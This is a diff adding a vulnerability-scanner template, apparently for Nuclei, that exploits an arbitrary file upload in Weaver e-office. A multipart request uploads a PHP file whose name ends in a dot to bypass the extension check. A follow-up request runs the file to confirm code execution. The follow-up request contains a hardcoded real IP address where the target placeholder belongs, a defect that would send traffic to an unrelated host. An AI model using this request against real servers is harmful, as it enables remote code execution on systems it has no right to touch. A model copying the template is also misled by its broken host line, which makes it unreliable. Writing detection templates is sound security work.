@@ -1,0 +1,51 @@
+id: weaver-e-office-mobile-upload-save-arbitrary-file-upload
+
+info:
+  name: weaver-e-office-mobile-upload-save-arbitrary-file-upload
+  author: SleepingBag945
+  severity: critical
+  description: 泛微e-office存在文件上传漏洞，攻击者可利用该漏洞获取服务器控制权。
+  reference:
+    - https://forum.butian.net/share/1791
+  tags: weaver,e-office,oa
+
+http:
+  - raw:
+      - |
+        POST /E-mobile/App/Ajax/ajax.php?action=mobile_upload_save HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+        Accept: */*
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynejqegqr
+        Accept-Encoding: gzip
+
+        ------WebKitFormBoundarynejqegqr
+        Content-Disposition: form-data; name="upload_quwan"; filename="{{randstr_1}}.php."
+        Content-Type: application/octet-stream
+
+        <?php echo "{{randstr_2}}"; unlink(__FILE__); ?>
+        ------WebKitFormBoundarynejqegqr--
+
+      - |
+        GET /attachment/{{attachmentID}}/{{randstr_1}}.php HTTP/1.1
+        Host: 61.184.73.157:8082
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+        Accept: */*
+        Accept-Encoding: gzip
+
+    extractors:
+      - type: regex
+        name: attachmentID
+        internal: true
+        regex:
+          - "[0-9]{10}"
+
+
+    req-condition: true
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl: 
+          - "status_code_1 == 200 && contains(body_1,'[1')"
+          - "contains(body_2, '{{randstr_2}}') && status_code_2 == 200"
+        condition: and
